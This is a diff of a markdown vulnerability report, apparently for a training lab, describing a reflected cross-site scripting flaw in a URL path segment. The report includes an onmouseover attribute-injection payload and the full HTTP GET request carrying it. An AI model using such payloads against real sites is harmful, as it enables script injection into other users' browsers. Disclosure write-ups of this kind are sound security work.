@@ -1,8 +1,8 @@
 ## Title
-Reflected Cross-Site Scripting (XSS) in Post ID Parameter
+Reflected Cross-Site Scripting (XSS) in URL Path Parameter
 
 ## Summary
-I identified a reflected Cross-Site Scripting (XSS) vulnerability in the post ID parameter of the following endpoint:
+I identified a reflected Cross-Site Scripting (XSS) vulnerability in the `URL Path` parameter of the following endpoint:
 
 ## Vulnerable Endpoint
 https://kzlabs.com/59.php/
@@ -23,15 +23,16 @@ https://labs.krazeplanet.com/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1
 t3_u9po1l%20onmouseover=alert(document.domain)%20y=
 
 # Proof of Concept
+This confirms the existence of the identified vulnerability.
 ## Screenshot 1 — Successful execution of the injected payload
 
 ![Payload Execution](screenshots/lab59.png)
 
-This confirms the existence of the identified vulnerability.
 
-http
+```http
 GET /59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l%20onmouseover=alert(document.domain)%20y= HTTP/1.1
 Host: kzlabs.com
+```
 
 ## Impact
 
